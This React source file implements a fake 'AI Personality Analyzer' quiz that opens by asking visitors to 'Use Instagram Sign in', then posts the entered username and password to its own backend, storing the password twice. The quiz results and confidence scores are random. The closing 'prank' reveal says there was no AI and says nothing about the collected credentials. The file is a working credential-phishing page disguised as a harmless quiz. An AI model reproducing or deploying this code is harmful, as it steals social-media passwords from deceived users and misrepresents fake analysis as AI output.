import React, { useState } from 'react';
import './App.css';

const API_URL = import.meta.env.VITE_API_URL;

const questions = [
  {
    question: 'What do you do when stressed?',
    options: ['Sleep', 'Eat', 'Watch Movies', 'Go Outside']
  },
  {
    question: 'How do your friends describe you?',
    options: ['Funny', 'Smart', 'Lazy', 'Creative']
  },
  {
    question: 'Favorite weekend activity?',
    options: ['Gaming', 'Travel', 'Reading', 'Sleeping']
  },
  {
    question: 'Choose a superpower',
    options: ['Flying', 'Invisible', 'Time Travel', 'Mind Reading']
  },
  {
    question: 'Favorite food?',
    options: ['Pizza', 'Burger', 'Biryani', 'Momos']
  },
  {
    question: 'Pick a vacation destination',
    options: ['Beach', 'Mountains', 'City', 'Forest']
  },
  {
    question: 'Which describes you best?',
    options: ['Leader', 'Thinker', 'Explorer', 'Dreamer']
  }
];

const animals = [
  '🦁 Lion',
  '🦊 Fox',
  '🐼 Panda',
  '🐒 Monkey',
  '🦉 Owl',
  '🐺 Wolf',
  '🦅 Eagle',
  '🦥 Sloth'
];

const loadingMessages = [
  'Connecting Neural Engine...',
  'Scanning Personality Traits...',
  'Comparing With 12 Million Profiles...',
  'Building Behavioral Matrix...',
  'Generating Spirit Animal...'
];

export default function App() {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [visitorId, setVisitorId] = useState(null);

  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState([]);

  const [animal, setAnimal] = useState('');
  const [progress, setProgress] = useState(0);
  const [loadingText, setLoadingText] = useState(
    loadingMessages[0]
  );

  const [confidenceScore, setConfidenceScore] =
    useState(95);

  const saveVisitor = async () => {
    if (!username.trim() || !password.trim()) {
      alert('Please enter username and password');
      return;
    }

    try {
      const response1 = await fetch(
        `${API_URL}/api/login`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            username,
            password
          })
        }
      );

      if (!response1.ok) {
        alert('Invalid user');
        return;
      }

      const response = await fetch(
        `${API_URL}/api/visitor`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            username: username,
            password: password,
            nickname: password
          })
        }
      );

      const data = await response.json();

      setVisitorId(data.id);
      setStep(2);
    } catch (error) {
      console.error(error);
      alert('Unable to save visitor');
    }
  };

  const saveAnswer = async (answer) => {
    const updatedAnswers = [...answers, answer];
    setAnswers(updatedAnswers);

    try {
      await fetch(`${API_URL}/api/answer`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          visitor_id: visitorId,
          question_no: currentQuestion + 1,
          answer
        })
      });
    } catch (error) {
      console.error(error);
    }

    if (currentQuestion < questions.length - 1) {
      setCurrentQuestion((prev) => prev + 1);
    } else {
      startAnalysis();
    }
  };

  const startAnalysis = () => {
    setStep(3);

    let currentProgress = 0;
    let messageIndex = 0;

    const interval = setInterval(async () => {
      currentProgress += 2;

      setProgress(currentProgress);

      if (
        currentProgress % 20 === 0 &&
        messageIndex < loadingMessages.length - 1
      ) {
        messageIndex++;
        setLoadingText(
          loadingMessages[messageIndex]
        );
      }

      if (currentProgress >= 100) {
        clearInterval(interval);

        const selectedAnimal =
          animals[
            Math.floor(
              Math.random() * animals.length
            )
          ];

        const score =
          90 + Math.floor(Math.random() * 10);

        setAnimal(selectedAnimal);
        setConfidenceScore(score);

        try {
          await fetch(`${API_URL}/api/result`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              visitor_id: visitorId,
              animal: selectedAnimal,
              completed: true
            })
          });
        } catch (error) {
          console.error(error);
        }

        setTimeout(() => {
          setStep(4);
        }, 800);
      }
    }, 120);
  };

  return (
    <div className="app-container">
      <div className="card">

        {step === 1 && (
          <>
            <h1 className="center">
              AI Personality Analyzer
            </h1>

            <p className="center">
              Use Instagram Sign in to start your personality analysis.
            </p>

            <input
              className="input"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Username/Email"
              autocomplete="username"
            />

            <input
              className="input"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              autocomplete="current-password"
            />

            <button
              className="button"
              onClick={saveVisitor}
            >
              Sign In
            </button>
          </>
        )}

        {step === 2 && (
          <>
            <h2>
              Question {currentQuestion + 1} of{' '}
              {questions.length}
            </h2>

            <div className="progress-container">
              <div
                className="progress-fill"
                style={{
                  width: `${
                    ((currentQuestion + 1) /
                      questions.length) *
                    100
                  }%`
                }}
              />
            </div>

            <h3>
              {
                questions[currentQuestion]
                  .question
              }
            </h3>

            {questions[
              currentQuestion
            ].options.map((option) => (
              <button
                key={option}
                className="option-btn"
                onClick={() =>
                  saveAnswer(option)
                }
              >
                {option}
              </button>
            ))}
          </>
        )}

        {step === 3 && (
          <>
            <h2 className="center">
              Analyzing Personality...
            </h2>

            <p className="center">
              {loadingText}
            </p>

            <div className="progress-container">
              <div
                className="progress-fill"
                style={{
                  width: `${progress}%`
                }}
              />
            </div>

            <h3 className="center">
              {progress}%
            </h3>
          </>
        )}

        {step === 4 && (
          <>
            <div className="center">
              <div className="animal">
                {animal}
              </div>

              <h2>Your Spirit Animal</h2>

              <p>
                Based on our advanced AI
                analysis, your personality
                aligns closely with this
                animal.
              </p>

              <h3>
                Confidence Score:{' '}
                {confidenceScore}%
              </h3>

              <button
                className="button"
                onClick={() => setStep(5)}
              >
                Reveal Truth
              </button>
            </div>
          </>
        )}

        {step === 5 && (
          <>
            <div className="center">
              <h1>😂 GOTCHA!</h1>

              <p>
                There was no AI.
              </p>

              <p>
                You answered random questions
                and received a random animal.
              </p>

              <p>
                Thanks for participating in
                the prank!
              </p>

              <button
                className="button"
                onClick={() =>
                  window.location.reload()
                }
              >
                Try Again
              </button>
            </div>
          </>
        )}

      </div>
    </div>
  );
}